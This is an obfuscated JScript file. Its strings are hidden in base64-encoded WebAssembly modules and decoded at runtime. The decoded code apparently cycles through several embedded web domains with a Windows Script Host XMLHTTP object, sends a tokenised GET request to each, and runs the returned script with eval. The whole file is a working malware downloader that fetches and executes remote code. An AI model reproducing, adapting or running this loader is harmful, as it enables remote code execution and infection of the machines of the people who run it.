const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGhIGAgAAWfwBBAQt/AEH4AAt/AEH+AAt/AEH6AQt/AEH+AQt/AEGCAgt/AEGGAgt/AEGWAgt/AEGaAgt/AEGeAgt/AEGkAgt/AEGoAgt/AEGqAgt/AEGuAgt/AEGwAgt/AEGyAgt/AEG4Agt/AEHCAgt/AEHEAgt/AEHGAgt/AEHMAgt/AEHQAgsHxoGAgAAXBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8GZGF0YTE2AxAGZGF0YTE3AxEGZGF0YTE4AxIGZGF0YTE5AxMGZGF0YTIwAxQGZGF0YTIxAxULtYOAgAAWAEEBC3VqZXN1c2ZvcmxpZmVjYy5jb20lMjBzdGVlbGdsb3NzYXJ5LmNvbSUyMHRoZXcudHJ1ZWNvbXBhc3NkZXNpZ25zLm5ldCUyMGNvdXJzZXMuZ29zcGVsYnJhbmRpbmcuY29tJTIwY3BhYnJhc2lsLmNvbS5icgAAQfgACwQlMjAAAEH+AAt7MDAwMDAwMUVyNldaRUpvSzZka2JIZ051QnViZm5tUjRXRkZ4RHVzVVRXZ0U5cEJRaGw5dVhjMkViYk43R2JpNDU1YnR4RXlFd1l6MnIyXzFIVEZkaEhwNEppZVBTZ2tOcWNSWU9uRl9QZkVsdFVjXzI2WW5OUXRuWEEAAEH6AQsCcAAAQf4BCwJoAABBggILAk0AAEGGAgsOU1hNTDIuWE1MSFRUUAAAQZYCCwJHAABBmgILA0VUAABBngILBCUyRgAAQaQCCwJ0AABBqAILAQAAQaoCCwJ0AABBrgILAQAAQbACCwEAAEGyAgsEJTNBAABBuAILCGNvdW50ZXIAAEHCAgsBAABBxAILAQAAQcYCCwQlM0YAAEHMAgsCYQAAQdACCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var x = lS(0, 0).split(lS(0, 1));
var m = lS(0, 2);
var zx = lS(0, 3);
var amn = lS(0, 4);
for (var i = 0; i < x.length; i++) {
    var e = WScript.CreateObject(lS(0, 5) + lS(0, 6));
    try {
        var ih = lS(0, 7) + lS(0, 8);
        var tjkh = x[i];
        var zn = lS(0, 9);
        var kt = lS(0, 10);
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.open(ih, amn + lS(0, 11) + lS(0, 12) + lS(0, 13) + kt + lS(0, 14) + zx + lS(0, 15) + zn + zn + tjkh + zn + lS(0, 16) + lS(0, 17) + zn + lS(0, 18) + lS(0, 19) + m, false);
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.send();
                    }
                }
            });
            const __exports = __callInstance0.exports;
            return __exports.data();
        })();
        var r = e.responseText;
        var mip = 500 + 500;
        if (r.length > mip && r.indexOf(m) > mip + 1 - 1002) {
            var ikagdh = r.split(m).join(lS(0, 20));
            window[lS(0, 21, true)](ikagdh);
            break;
        }
        ;
    } catch (e) {
    }
    ;
}
;